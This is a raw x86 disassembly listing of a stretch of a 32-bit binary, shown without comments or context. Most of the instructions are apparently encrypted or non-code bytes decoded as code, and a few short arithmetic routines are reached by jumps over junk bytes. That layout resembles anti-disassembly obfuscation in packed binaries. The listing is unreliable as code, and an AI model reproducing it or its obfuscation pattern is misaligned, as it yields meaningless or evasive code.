  408ffa:	jmp    0x40901a
  408ffc:	inc    esi
  408ffd:	rcr    DWORD PTR ds:0x50c8d072,0xbd
  409004:	pop    esi
  409005:	adc    esi,DWORD PTR [edi-0x78]
  409008:	or     eax,0x8fa6c23f
  40900d:	push   cs
  40900e:	sub    eax,0x3d0a473d
  409013:	js     0x408fc4
  409015:	jns    0x408fce
  409017:	and    DWORD PTR [eax],ebp
  409019:	outs   dx,DWORD PTR ds:[esi]
  40901a:	imul   esp,DWORD PTR [edi+eiz*1-0x5a],0x75
  40901f:	or     eax,eax
  409021:	cmp    esp,DWORD PTR [edx]
  409023:	mov    ecx,0x7eaa82d6
  409028:	pusha  
  409029:	rol    edi,cl
  40902b:	test   DWORD PTR fs:[eax-0x3a],0x3eed5da7
  409033:	loopne 0x409075
  409035:	xchg   esi,eax
  409036:	cmc    
  409037:	push   0xffffffb4
  409039:	mov    ah,BYTE PTR ds:0xc69ce18d
  40903f:	add    BYTE PTR [ebx-0x68],dl
  409042:	out    0x87,al
  409044:	pop    es
  409045:	xchg   esi,eax
  409046:	lods   al,BYTE PTR ds:[esi]
  409047:	test   DWORD PTR [ebx+ebx*4+0x63],0xe748c617
  40904f:	mov    dh,0xbe
  409051:	xchg   BYTE PTR [ecx],cl
  409053:	fld    TBYTE PTR [edi]
  409055:	loopne 0x40902f
  409057:	mov    dl,0x46
  409059:	adc    dh,BYTE PTR [edi+0x6c]
  40905c:	inc    ebp
  40905d:	mov    bh,0xf0
  40905f:	(bad)  
  409060:	loope  0x409032
  409062:	clc    
  409063:	into   
  409064:	jnp    0x409063
  409066:	xlat   BYTE PTR ds:[ebx]
  409067:	sub    ecx,edx
  409069:	popa   
  40906a:	repz mov ds:0xa0782a54,eax
  409070:	jle    0x409096
  409072:	cdq    
  409073:	aas    
  409074:	enter  0xe0a4,0x73
  409078:	mov    esi,0x35299a47
  40907d:	shr    BYTE PTR [edi+0x3007826b],cl
  409083:	jmp    0xbd84b63
  409088:	ds leave 
  40908a:	sbb    eax,0x3d2e2d70
  40908f:	(bad)
  409093:	cli    
  409094:	add    eax,DWORD PTR [edi+ebp*2+0x6290fa5f]
  40909b:	mov    ss,eax
  40909d:	gs xchg esi,eax
  40909f:	add    eax,DWORD PTR [edi-0x52021205]
  4090a5:	jbe    0x40903b
  4090a7:	sub    al,0x57
  4090a9:	jl     0x4090a3
  4090ab:	idiv   BYTE PTR [ebp-0x1e]
  4090ae:	out    0x4d,eax
  4090b0:	das    
  4090b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090b2:	xor    al,0x4a
  4090b4:	test   al,0x3a
  4090b6:	(bad)  
  4090b7:	and    eax,0x6543c60d
  4090bc:	stc    
  4090bd:	lahf   
  4090be:	xchg   edx,eax
  4090bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090c1:	fucomi st,st(3)
  4090c3:	inc    ecx
  4090c4:	cmp    eax,0x435b6329
  4090c9:	xchg   ch,cl
  4090cb:	mov    edi,0x9319e664
  4090d0:	aam    0x3b
  4090d2:	lock mov DWORD PTR ds:0x42a801,0x7b75
  4090dd:	jne    0x4093c9
  4090e3:	jmp    0x4093a9
  4090e8:	retf   0xd0cb
  4090eb:	cmp    eax,0xcbd9d1d5
  4090f0:	mov    edx,0xba4c6c4
  4090f5:	sbb    BYTE PTR [ecx],dh
  4090f7:	add    ecx,DWORD PTR [esi-0x58878711]
  4090fd:	jle    0x409177
  4090ff:	js     0x409117
  409101:	bound  edx,QWORD PTR [ebx-0x4ec4efc4]
  409107:	or     eax,0x258df59f
  40910c:	cmp    cl,cl
  40910e:	xchg   ebp,eax
  40910f:	icebp  
  409110:	nop
  409111:	popf   
  409112:	nop
  409113:	add    ch,BYTE PTR [esi-0x25]
  409116:	icebp  
  409117:	pop    es
  409118:	jle    0x40918e
  40911a:	lods   al,BYTE PTR ds:[esi]
  40911b:	shl    DWORD PTR [ebx+0x629ad6f4],cl
  409121:	cli    
  409122:	sbb    eax,DWORD PTR [ecx-0x3684548f]
  409128:	cmp    dh,ch
  40912a:	jae    0x4090e0
  40912c:	pusha  
  40912d:	add    eax,0xda3a6b23
  409132:	mov    DWORD PTR [ecx+0x44],edi
  409135:	fadd   st,st(0)
  409137:	inc    esp
  409138:	inc    edx
  409139:	push   ebx
  40913a:	lods   eax,DWORD PTR ds:[esi]
  40913b:	mov    al,ds:0x23c62aca
  409140:	pop    ds
  409141:	or     cl,BYTE PTR [esi+0x695d96f6]
  409147:	daa    
  409148:	into   
  409149:	push   cs
  40914a:	or     BYTE PTR ds:0xcd060d83,0x4f
  409151:	fisub  DWORD PTR [edi-0x5679cbbb]
  409157:	or     BYTE PTR [edx+0x678d61a4],bl
  40915d:	mov    bl,0x26
  40915f:	cmp    ecx,DWORD PTR [edi+ecx*1]
  409162:	mov    al,0x10
  409164:	fxch   st(4)
  409166:	adc    DWORD PTR [esi],eax
  409168:	dec    edx
  409169:	pusha  
  40916a:	out    0x55,al
  40916c:	mov    esi,0x38b9db31
  409171:	ficomp WORD PTR [esi]
  409173:	mov    edx,0x4fbe3bec
  409178:	xor    edi,DWORD PTR [ebx*2+0x46d8e3f3]
  40917f:	mov    eax,ds
  409181:	mov    al,ah
  409183:	sub    DWORD PTR [edi+ebp*1+0x5c88b7d5],edi
  40918a:	fwait
  40918b:	push   ss
  40918c:	dec    ecx
  40918d:	pop    ecx
  40918e:	in     eax,dx
  40918f:	xchg   ebx,eax
  409190:	inc    ebx
  409191:	mov    eax,0x295b0b85
  409196:	aad    0x34
  409198:	or     eax,0xd70f277
  40919d:	daa    
  40919e:	fdivr  QWORD PTR [ebp+edi*1+0x67]
  4091a2:	sbb    BYTE PTR [esi+0x46],ah
  4091a5:	mov    eax,ds:0x7b4de1b6
  4091aa:	and    al,0x85
  4091ac:	adc    DWORD PTR [ebx+0x3e],edx
  4091af:	jle    0x40915e
  4091b1:	loop   0x409217
  4091b3:	jecxz  0x409212
  4091b5:	jns    0x4091b6
  4091b7:	ins    BYTE PTR es:[edi],dx
  4091b8:	fiadd  WORD PTR [eax]
  4091ba:	aas    
  4091bb:	jp     0x409191
  4091bd:	dec    edi
  4091be:	xchg   ecx,eax
  4091bf:	jne    0x4091a2
  4091c1:	leave  
  4091c2:	xor    DWORD PTR [edx],ebx
  4091c4:	mov    esi,0x45dc81d9
  4091c9:	std    
  4091ca:	xor    bl,BYTE PTR [eax-0x67dc64c7]
  4091d0:	cmp    bh,al
  4091d2:	adc    DWORD PTR [ebp-0x3930d6e3],ebp
  4091d8:	cli    
  4091d9:	inc    ebx
  4091da:	add    al,0xe3
  4091dc:	in     eax,0x45
  4091de:	mov    ecx,0x3ae5a29b
  4091e3:	out    dx,al
  4091e4:	jns    0x409261
  4091e6:	sub    edx,DWORD PTR [ebx+0x414c60d2]
  4091ec:	scas   eax,DWORD PTR es:[edi]
  4091ed:	jecxz  0x409181
  4091ef:	xor    DWORD PTR [edx+0x56ea51c3],eax
  4091f5:	inc    ebp
  4091f6:	nop
  4091f7:	mov    BYTE PTR [ebp+0x7],bl
  4091fa:	xor    esp,DWORD PTR [edi+esi*2]
  4091fd:	sbb    eax,0x7f2c8863
  409202:	sub    al,0x15
  409204:	call   0x91bf:0xa4e9d9c9
  40920b:	pop    ds
  40920c:	push   es
  40920d:	or     dh,BYTE PTR [ebp+0x3e]
  409210:	push   es
  409211:	lea    ebp,[eax-0x1a]
  409214:	cmp    al,0xa7
  409216:	push   ds
  409217:	sbb    ebp,ebp
  409219:	icebp  
  40921a:	or     ah,BYTE PTR [edi+edi*2+0x1ab2833]
  409221:	pop    ecx
  409222:	call   0xeda:0x71fdf11b
  409229:	inc    edi
  40922a:	adc    BYTE PTR [edi],dh
  40922c:	inc    esi
  40922d:	add    al,0x71
  40922f:	fisttp QWORD PTR [ecx-0x69]
  409232:	mov    eax,ds:0x8c5dbd58
  409237:	adc    bl,BYTE PTR [eax]
  409239:	jmp    0x40920d
  40923b:	inc    ebx
  40923c:	push   0xffffffc7
  40923e:	shr    ch,1
  409240:	jmp    0x409289
  409242:	push   0x8ca95437
  409247:	(bad)  
  409248:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40924a:	retf   0x28be
  40924d:	mov    esi,0x3f93fa32
  409252:	std    
  409253:	pop    ecx
  409254:	mov    al,0xcf
  409256:	push   ecx
  409257:	lahf   
  409258:	shl    DWORD PTR [eax-0x50b403b0],1
  40925e:	mov    BYTE PTR [ebx-0x2493a8ae],ah
  409264:	cmp    BYTE PTR [eax-0x26f14e74],cl
  40926a:	into   
  40926b:	cmp    al,0xab
  40926d:	clc    
  40926e:	inc    edx
  40926f:	scas   eax,DWORD PTR es:[edi]
  409270:	push   0xffffffc2
  409272:	mov    bl,0x67
  409274:	fmul   QWORD PTR [esi+0x2c]
  409277:	adc    DWORD PTR [eax-0x1ebe6ed7],ebp
  40927d:	call   0x845619de
  409282:	add    ebp,DWORD PTR ds:0x2aaf9240
  409288:	pusha  
  409289:	loopne 0x409245
  40928b:	aas    
  40928c:	dec    edi
  40928d:	icebp  
  40928e:	mov    bl,0xa0
  409290:	add    BYTE PTR [ebx-0x66dbe914],bh
  409296:	sub    eax,0xc944bacd
  40929b:	jne    0x40922d
  40929d:	xlat   BYTE PTR ds:[ebx]
  40929e:	sub    BYTE PTR [esi-0x9],al
  4092a1:	add    BYTE PTR [edx],dh
  4092a3:	dec    ecx
  4092a4:	sub    DWORD PTR [eax-0x3134ef54],0x8672524
  4092ae:	pop    ss
  4092af:	jbe    0x409294
  4092b1:	jg     0x4092c6
  4092b3:	bound  ebp,QWORD PTR [edx+0x369180f7]
  4092b9:	and    bl,BYTE PTR ds:0x13cc9d
  4092bf:	jno    0x4092ef
  4092c1:	mov    ch,0x3e
  4092c3:	iret   
  4092c4:	xlat   BYTE PTR ds:[ebx]
  4092c5:	xor    bh,BYTE PTR [ecx-0x8]
  4092c8:	aad    0xa5
  4092ca:	mov    esi,ebx
  4092cc:	or     DWORD PTR [edi],edx
  4092ce:	ins    DWORD PTR es:[edi],dx
  4092cf:	sbb    al,0x87
  4092d1:	push   ds
  4092d2:	cdq    
  4092d3:	push   cs
  4092d4:	jbe    0x4092f5
  4092d6:	push   ebx
  4092d7:	push   es
  4092d8:	test   al,0xaa
  4092da:	jb     0x409293
  4092dc:	sbb    eax,0x866df691
  4092e1:	inc    ebp
  4092e2:	jle    0x409281
  4092e4:	fisttp QWORD PTR [esi+ebp*1]
  4092e7:	xor    BYTE PTR [eax-0x1f7ac74f],0xb7
  4092ee:	add    eax,0x4d97a1b0
  4092f3:	sub    ah,BYTE PTR [ebp+0x79f53c38]
  4092f9:	sbb    ecx,eax
  4092fb:	ss push edi
  4092fd:	dec    eax
  4092fe:	sbb    DWORD PTR [eax],edi
  409300:	call   0x16eb:0xd7265e62
  409307:	jo     0x409371
  409309:	dec    eax
  40930a:	jns    0x409318
  40930c:	push   esp
  40930d:	call   0x3ebb34d2
  409312:	in     al,0x15
  409314:	sbb    dl,BYTE PTR [edx]
  409316:	test   BYTE PTR [ebp+eax*2+0x6],dl
  40931a:	shl    BYTE PTR [ecx+ebp*8-0x2dad9eac],cl
  409321:	add    al,0x34
  409323:	(bad)
  409326:	xchg   edx,eax
  409327:	cmp    eax,0x40689585
  40932c:	mov    dh,0x3f
  40932e:	das    
  40932f:	dec    edi
  409330:	les    ebp,FWORD PTR [edx-0x63d54ea2]
  409336:	jo     0x409317
  409338:	xlat   BYTE PTR ds:[ebx]
  409339:	pop    ds
  40933a:	sar    BYTE PTR [eax+0x18],1
  40933d:	sbb    DWORD PTR [edx-0xd],eax
  409340:	ins    DWORD PTR es:[edi],dx
  409341:	pop    esi
  409342:	xchg   DWORD PTR [edi],edx
  409344:	pushf  
  409345:	xchg   BYTE PTR [edi-0x671ce42e],ch
  40934b:	dec    esp
  40934c:	bound  esi,QWORD PTR [ebx]
  40934e:	ror    DWORD PTR ds:0x90e9f811,1
  409354:	enter  0xd9b5,0xb6
  409358:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409359:	push   eax
  40935a:	sub    ebx,DWORD PTR [ebx+0x44963b99]
  409360:	es ret 0x6931
  409364:	fs push ebx
  409366:	push   cs
  409367:	jmp    0x7b2:0xa854603a
  40936e:	adc    eax,0x49527b8f
  409373:	out    0x45,al
  409375:	call   0xecd5fe1c
  40937a:	test   al,0x35
  40937c:	fadd   DWORD PTR ds:0x7ba9ef74
  409382:	(bad)  
  409383:	(bad)  
  409384:	repnz adc al,ah
  409387:	jle    0x409330
  409389:	pop    es
  40938a:	hlt    
  40938b:	scas   al,BYTE PTR es:[edi]
  40938c:	pop    edi
  40938d:	sti    
  40938e:	(bad)  
  40938f:	lods   al,BYTE PTR ds:[esi]
  409390:	loop   0x409372
  409392:	scas   al,BYTE PTR es:[edi]
  409393:	mov    bl,0xff
  409395:	ins    BYTE PTR es:[edi],dx
  409396:	xor    dh,BYTE PTR [ebx]
  409398:	js     0x409364
  40939a:	push   cs
  40939b:	ds sahf 
  40939d:	(bad)  
  40939e:	jmp    0x1a3a:0x92061512
  4093a5:	cld    
  4093a6:	cmc    
  4093a7:	push   esp
  4093a8:	cmp    al,0x8b
  4093aa:	inc    ebp
  4093ab:	cld    
  4093ac:	add    DWORD PTR ds:0x42a7b9,0x42a769
  4093b6:	mov    esi,DWORD PTR [ebp-0x8]
  4093b9:	xor    eax,edx
  4093bb:	xor    esi,edx
  4093bd:	add    eax,ecx
  4093bf:	add    esi,ecx
  4093c1:	imul   eax,esi
  4093c4:	jmp    0x4096ca
  4093c9:	mov    eax,DWORD PTR [ebp+0xc]
  4093cc:	mov    eax,DWORD PTR [eax+0x78]
  4093cf:	mov    DWORD PTR [ebp+0xc],eax
  4093d2:	mov    eax,DWORD PTR [ebp-0x4]
  4093d5:	mov    esi,DWORD PTR [ebp-0x8]
  4093d8:	xor    eax,edx
  4093da:	xor    esi,edx
  4093dc:	add    eax,ecx
  4093de:	add    esi,ecx
  4093e0:	imul   eax,esi
  4093e3:	mov    esi,DWORD PTR [ebp+0xc]
  4093e6:	cmp    esi,eax
  4093e8:	jmp    0x4096ae
  4093ed:	xlat   BYTE PTR ds:[ebx]
  4093ee:	leave  
  4093ef:	retf   0xdad6
  4093f2:	aad    0xdb
  4093f4:	leave  
  4093f5:	adc    bl,BYTE PTR ds:0x23e6ff3d
  4093fb:	shl    DWORD PTR [edi+0x7878ec35],cl
  409401:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409402:	jle    0x40947c
  409404:	js     0x40942b
  409406:	fs sub eax,0xdf0cf776
  40940c:	add    ebx,DWORD PTR [edi+0x60]
  40940f:	xor    eax,0x701d9aa1
  409414:	pop    edx
  409415:	jmp    0xe434b1ec
  40941a:	in     al,dx
  40941b:	sub    esi,DWORD PTR [edi-0x4]
  40941e:	mov    dh,0x7b
  409420:	int    0x4d
  409422:	mov    WORD PTR [ebp-0x13eabe70],?
  409428:	fs (bad) 
  40942a:	jmp    0xdde3e09d
  40942f:	pop    edi
  409430:	sub    eax,0xbdd4e90c
  409435:	ins    BYTE PTR es:[edi],dx
  409436:	and    eax,0xfb40c5bd
  40943b:	inc    edx
  40943c:	arpl   WORD PTR [edi-0x75],bx
  40943f:	push   ds
  409440:	cld    
  409441:	mov    DWORD PTR [ebp-0x6e],esi
  409444:	out    dx,eax
  409445:	mov    ebp,0xe978858b
  40944a:	into   
  40944b:	sbb    dh,BYTE PTR [esi]
  40944d:	rcl    DWORD PTR [eax+0x1c],1
  409450:	pop    ebp
  409451:	test   BYTE PTR [esi],bh
  409453:	inc    ecx
  409454:	lds    ecx,FWORD PTR [ebx]
  409456:	out    0xe5,eax
  409458:	inc    ecx
  409459:	xor    al,0xc1
  40945b:	pop    DWORD PTR [ebx]
  40945d:	push   0x3f
  40945f:	cwde   
  409460:	xchg   ebx,eax
  409461:	fcomp  st(3)
  409463:	inc    edx
  409464:	test   DWORD PTR [ecx],esi
  409466:	pusha  
  409467:	jmp    0xb0acb8f2
  40946c:	pop    ebp
  40946d:	jge    0x409486
  40946f:	out    0x6f,al
  409471:	out    dx,al
  409472:	test   edi,0x97ec1d87
  409478:	push   edi
  409479:	xor    DWORD PTR [esi],ecx
  40947b:	lea    eax,[esi+0x79]
  40947e:	pop    ebp
  40947f:	mov    ebp,0xebf963df
  409484:	cld    
  409485:	cld    
  409486:	jno    0x409427
  409488:	inc    edi
  409489:	daa    
  40948a:	sar    BYTE PTR [eax+eax*1-0xa7b93a8],1
  409491:	call   0x8f90bbaa
  409496:	jg     0x4094b1
  409498:	daa    
  409499:	sbb    al,0x28
  40949b:	inc    ebp
  40949c:	jns    0x40948f
  40949e:	cmp    al,0x2a
  4094a0:	cld    
  4094a1:	call   0x86cef4c6
  4094a6:	jns    0x409478
  4094a8:	outs   dx,BYTE PTR ds:[esi]
  4094a9:	mov    dh,0xf
  4094ab:	xor    dh,0x1e
  4094ae:	xor    eax,0xb3883196
  4094b3:	lea    ebx,[esi-0x40]
  4094b6:	out    dx,eax
  4094b7:	je     0x40948e
  4094b9:	lods   eax,DWORD PTR ds:[esi]
  4094ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094bb:	lods   al,BYTE PTR ds:[esi]
  4094bc:	popf   
  4094bd:	fidivr DWORD PTR [edi+0x5803d9a6]
  4094c3:	mov    ebx,0xef8fab4b
  4094c8:	ds mov esp,0xe9269887
  4094ce:	test   al,cl
  4094d0:	test   eax,0xe5998102
  4094d5:	jl     0x409466
  4094d7:	cmp    edi,DWORD PTR [esi-0x2e]
  4094da:	dec    edi
  4094db:	jb     0x409551
  4094dd:	fist   WORD PTR [eax]
  4094df:	shr    DWORD PTR cs:[ecx],0xa8
  4094e3:	mov    bl,0xdd
  4094e5:	jo     0x40950f
  4094e7:	xchg   ebp,eax
  4094e8:	mov    eax,0xfbb02362
  4094ed:	adc    esi,DWORD PTR [edi+0x3]
  4094f0:	mov    ecx,0x72494f6c
  4094f5:	pop    esi
  4094f6:	dec    ebp
  4094f7:	add    BYTE PTR [edi-0x48],al
  4094fa:	std    
  4094fb:	popf   
  4094fc:	(bad)  
  4094fd:	fimul  WORD PTR [esi]
  4094ff:	sub    eax,0x407072d6
  409504:	inc    edi
  409505:	fistp  QWORD PTR [ebx+eax*4]
  409508:	xchg   esi,eax
  409509:	aad    0x31
  40950b:	loopne 0x409534
  40950d:	sbb    edi,0x5d0da080
  409513:	adc    eax,0x747c2df9
  409518:	mov    bh,0x4d
  40951a:	mov    ebp,0x5f5d248a
  40951f:	dec    eax
  409520:	and    al,BYTE PTR [ebx+esi*4+0x25b895a]
  409527:	jle    0x409574
  409529:	pop    esi
  40952a:	popf   
  40952b:	xchg   ebp,eax
  40952c:	mov    ebx,0x67cec842
  409531:	add    eax,0x52ede99
  409536:	mov    ss,esi
  409538:	jle    0x409563
  40953a:	inc    esp
  40953b:	out    dx,eax
  40953c:	xchg   esp,eax
  40953d:	adc    al,0x7b
  40953f:	cmp    bh,al
  409541:	out    0x46,eax
  409543:	cwde   
  409544:	sbb    bl,BYTE PTR [ecx]
  409546:	dec    edi
  409547:	call   0xee5d:0xfa8c460b
  40954e:	inc    ebx
  40954f:	cwde   
  409550:	inc    esi
  409551:	mov    edx,0x849dd830
  409556:	jno    0x4095d7
  409558:	pop    edx
  409559:	ret    
  40955a:	sub    al,0xa0
  40955c:	dec    edx
  40955d:	in     al,0xd4
  40955f:	es (bad) 
  409561:	cmp    eax,0x758654f0
  409566:	popa   
  409567:	push   edi
  409568:	sbb    edi,ebp
  40956a:	inc    ecx
  40956b:	iret   
  40956c:	sub    esi,DWORD PTR [ebp-0x1c]
  40956f:	cmp    ecx,ebx
  409571:	inc    ebp
  409572:	push   esi
  409573:	dec    edx
  409574:	fadd   DWORD PTR [ecx]
  409576:	jle    0x4095a1
  409578:	pop    edi
  409579:	xchg   edi,eax
  40957a:	jnp    0x4095df
  40957c:	idiv   edi
  40957e:	cli    
  40957f:	pushf  
  409580:	and    DWORD PTR [esi+ebp*8],esi
  409583:	test   DWORD PTR [edx+0x43],ebx
  409586:	dec    ebx
  409587:	neg    DWORD PTR [ecx+0x5f]
  40958a:	mov    ebx,0xec708ec9
  40958f:	and    eax,ebp
  409591:	into   
  409592:	das    
  409593:	mov    bh,ch
  409595:	push   es
  409596:	jle    0x4095b5
  409598:	or     al,0xa7
  40959a:	mov    eax,0x6be41f9
  40959f:	jge    0x40959b
  4095a1:	dec    edi
  4095a2:	je     0x409621
  4095a4:	jno    0x4095fe
  4095a6:	xor    edx,DWORD PTR [edi]
  4095a8:	int3   
  4095a9:	ins    DWORD PTR es:[edi],dx
  4095aa:	add    al,0x48
  4095ac:	sbb    BYTE PTR [edx+0x20],cl
  4095af:	repz add al,0x50
  4095b2:	mov    dh,0xaa
  4095b4:	adc    edi,DWORD PTR [edi+0x54]
  4095b7:	mov    DWORD PTR [esi-0x105e339e],edx
  4095bd:	push   DWORD PTR [edi-0x5080e160]
  4095c3:	int3   
  4095c4:	sbb    ch,BYTE PTR [esp+ecx*8+0xf95cbac]
  4095cb:	sbb    bl,bl
  4095cd:	xor    ch,BYTE PTR [esp-0x516b0d81]
  4095d4:	cld    
  4095d5:	mov    ds:0x901f6753,eax
  4095da:	aas    
  4095db:	or     BYTE PTR [eax+0x4cc6ef87],bl
  4095e1:	push   eax
  4095e2:	jno    0x409626
  4095e4:	add    DWORD PTR [eax+0x73c262d],ebp
  4095ea:	sbb    dh,BYTE PTR [ebp+0x7c92e84b]
  4095f0:	push   ecx
  4095f1:	and    eax,esp
  4095f3:	in     eax,dx
  4095f4:	jo     0x4095ff
  4095f6:	int3   
  4095f7:	and    al,0x22
  4095f9:	sub    dh,bh
  4095fb:	mov    edi,0xbc1f3220
  409600:	fwait
  409601:	push   cs
  409602:	mov    ds:0xff79e57b,eax
  409607:	jg     0x409614
  409609:	leave  
  40960a:	(bad)  
  40960b:	xor    cl,bl
  40960d:	sub    BYTE PTR [esi],ah
  40960f:	cwde   
  409610:	icebp  
  409611:	pop    eax
  409612:	push   ds
  409613:	mov    bh,0x59
  409615:	mov    ds:0x20416431,al
  40961a:	and    ch,BYTE PTR ds:0x2e46f560
  409620:	mov    dl,0xc5
  409622:	lahf   
  409623:	cmp    DWORD PTR [edi+0xf560827],edi
  409629:	inc    ecx
  40962a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40962b:	popa   
  40962c:	jb     0x4095b0
  40962e:	xchg   edi,eax
  40962f:	sbb    al,0x51
  409631:	dec    edi
  409632:	adc    ecx,ebx
  409634:	ret    0xfc06
  409637:	jecxz  0x4095cb
  409639:	aas    
  40963a:	mov    edi,0xf91deaf0
  40963f:	cmp    BYTE PTR [ebp+esi*2-0x62],bh
  409643:	in     al,dx
  409644:	mov    edi,esi
  409646:	xchg   esp,eax
  409647:	(bad)  
  409649:	and    ah,BYTE PTR [ebx-0x5c493466]
  40964f:	or     BYTE PTR [esi-0x48d9a316],dl
  409655:	sub    eax,0x59526d3a
  40965a:	cmp    BYTE PTR [ebx],cl
  40965c:	jle    0x409693
  40965e:	jmp    0x40961b
  409660:	test   eax,0x43b131da
  409665:	aaa    
  409666:	data16 clc 
  409668:	std    
  409669:	or     al,0xd
  40966b:	jle    0x409652
  40966d:	out    0x4b,eax
  40966f:	dec    esi
  409670:	sti    
  409671:	mov    bl,0xe3
  409673:	cld    
  409674:	lock xor eax,DWORD PTR [eax+0x25a22755]
  40967b:	xor    bl,ah
  40967d:	sbb    esi,ebx
  40967f:	test   BYTE PTR [ebx-0x745427b3],dl
  409685:	mov    esi,0x46f00254
  40968a:	stos   BYTE PTR es:[edi],al
  40968b:	arpl   si,cx
  40968d:	ins    DWORD PTR es:[edi],dx
  40968e:	and    eax,0x8c558be1
  409693:	shl    esp,0x62
  409696:	cs jmp 0x893c:0xc004599c
  40969e:	or     BYTE PTR [ebx],0xa9
  4096a1:	cmp    eax,0x13d153ad
  4096a6:	add    DWORD PTR [eax-0x537bbc37],ebp
  4096ac:	mov    esp,DWORD PTR [ecx]
  4096ae:	mov    eax,DWORD PTR [ebp-0x4]
  4096b1:	je     0x4093ac
  4096b7:	xor    eax,edx
  4096b9:	add    eax,ecx
  4096bb:	mov    ecx,DWORD PTR [ebp+0xc]
  4096be:	imul   eax,ecx
  4096c1:	add    eax,DWORD PTR [ebp+0x8]
  4096c4:	mov    DWORD PTR [ebp+0xc],eax
  4096c7:	mov    eax,DWORD PTR [ebp+0xc]
  4096ca:	pop    esi
  4096cb:	leave  
  4096cc:	ret    0x8
  4096cf:	push   ebp
  4096d0:	mov    ebp,esp
  4096d2:	jmp    0x4099c5
  4096d7:	leave  
  4096d8:	enter  0x3ed6,0xd9
  4096dc:	(bad)  
  4096dd:	(bad)  
  4096df:	xlat   BYTE PTR ds:[ebx]
  4096e0:	enter  0xc218,0x94
  4096e4:	in     al,0x1f
  4096e6:	sbb    DWORD PTR [edx+esi*8+0x78],0x78
  4096eb:	push   edx
  4096ec:	jle    0x409766
  4096ee:	js     0x40974a
  4096f0:	addr16 pushf 
  4096f2:	js     0x40975a
  4096f4:	cmp    dl,BYTE PTR [esi]
  4096f6:	nop
  4096f7:	jle    0x409737
  4096f9:	pop    ds
  4096fa:	cdq    
  4096fb:	add    eax,0x72078c3d
  409700:	sub    esi,DWORD PTR [eax-0x53]
  409703:	xchg   ecx,eax
  409704:	jp     0x409699
  409706:	pop    ebp
  409707:	push   ebp
  409708:	pop    es
  409709:	arpl   WORD PTR [ebp+ebp*1+0x138b5204],dx
  409710:	adc    BYTE PTR ds:0xe66cef9f,0x42
  409717:	xchg   ecx,eax
  409718:	cmp    al,0x8f
  40971a:	fiadd  WORD PTR [ebp+0x2b]
  40971d:	les    edx,FWORD PTR [ebx*8+0x55c93679]
  409724:	dec    eax
  409725:	shr    DWORD PTR [eax+0xab5e111],1
  40972b:	mov    ebx,gs
  40972d:	jne    0x4096d3
  40972f:	lock mov dl,0xfd
  409732:	mov    eax,0xc1586ffa
  409737:	or     BYTE PTR [ecx+0x43518ecd],0x4f
  40973e:	test   DWORD PTR [edx-0x61073bdd],0x77cf6411
  409748:	pop    esi
  409749:	dec    ebp
  40974a:	stos   BYTE PTR es:[edi],al
  40974b:	and    al,0xa4
  40974d:	push   esi
  40974e:	call   0xe8b5d66e
  409753:	shl    BYTE PTR [edi-0x7c398386],cl
  409759:	ss out dx,eax
  40975b:	ins    DWORD PTR es:[edi],dx
  40975c:	enter  0x23a9,0x55
  409760:	mov    dl,0xa1
  409762:	mov    al,ds:0xdfe87205
  409767:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409768:	jmp    0x7369:0x4aa0c44
  40976f:	jae    0x4097ed
  409771:	add    al,0xd8
  409773:	jecxz  0x409725
  409775:	fild   DWORD PTR [edi-0x5ad93db0]
  40977b:	pusha  
  40977c:	add    al,0xf8
  40977e:	mov    eax,0xd60fed14
  409783:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409784:	ins    BYTE PTR es:[edi],dx
  409785:	leave  
  409786:	dec    ebp
  409787:	mov    ebx,0x76c4d8a9
  40978c:	pop    edi
  40978d:	xor    edi,DWORD PTR [edx-0x22bc5eff]
  409793:	jns    0x40973f
  409795:	and    DWORD PTR [ebp+0x7f80a1ad],0xc487b4b4
  40979f:	sbb    DWORD PTR [edx+0x1da875b0],edi
  4097a5:	xchg   esp,eax
  4097a6:	sub    BYTE PTR [esi],dl
  4097a8:	adc    DWORD PTR [eax-0x5394e457],edx
  4097ae:	and    al,0x78
  4097b0:	lods   eax,DWORD PTR ds:[esi]
  4097b1:	sub    al,0xbb
  4097b3:	inc    edx
  4097b4:	or     eax,0x668bd0f4
  4097b9:	cs dec esi
  4097bb:	dec    edi
  4097bc:	jge    0x409751
  4097be:	mov    eax,ds:0xc30a5c05
  4097c3:	pop    es
  4097c4:	xchg   DWORD PTR [esi+0x78ced8a],esi
  4097ca:	cmp    DWORD PTR [edi+0x5],edx
  4097cd:	and    al,al
  4097cf:	xchg   BYTE PTR [esi+0x795ee1b1],ah
  4097d5:	retf   0x4d3d
  4097d8:	adc    edi,esi
  4097da:	shl    ah,0x47
  4097dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097de:	test   esi,0x9d2ff277
  4097e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097e5:	mov    al,0x93
  4097e7:	gs or  al,0x80
  4097ea:	sbb    esp,DWORD PTR [ebp+0x6e02fef6]
  4097f0:	sahf   
  4097f1:	call   0x6cad50b4
  4097f6:	sub    eax,0x7d9bc08f
  4097fb:	xchg   DWORD PTR [esi+edx*4],ebx
  4097fe:	call   DWORD PTR [ecx-0x558d3e9a]
  409804:	cld    
  409805:	bound  esp,QWORD PTR [ecx+0x28]
  409808:	dec    esi
  409809:	push   0xffffffb4
  40980b:	mov    esp,0xcef6c6c3
  409810:	inc    edi
  409812:	adc    al,0xcb
  409814:	pop    edx
  409815:	jno    0x4097b3
  409817:	mov    bl,0x10
  409819:	dec    ebp
  40981a:	mov    ebp,ebx
  40981c:	mov    eax,0x7a96cdd2
  409821:	push   ebp
  409822:	push   0x40e6004b
  409827:	outs   dx,BYTE PTR ds:[esi]
  409828:	xor    al,0xf2
  40982a:	pop    edx
  40982b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40982c:	xchg   ebx,eax
  40982d:	xor    DWORD PTR fs:[ecx+esi*1+0x56],eax
  409832:	sti    
  409833:	jno    0x40989a
  409835:	hlt    
  409836:	jb     0x409869
  409838:	rcr    esp,0xe4
  40983b:	retf   
  40983c:	mov    al,ds:0x2024abbb
  409841:	xchg   ebx,ecx
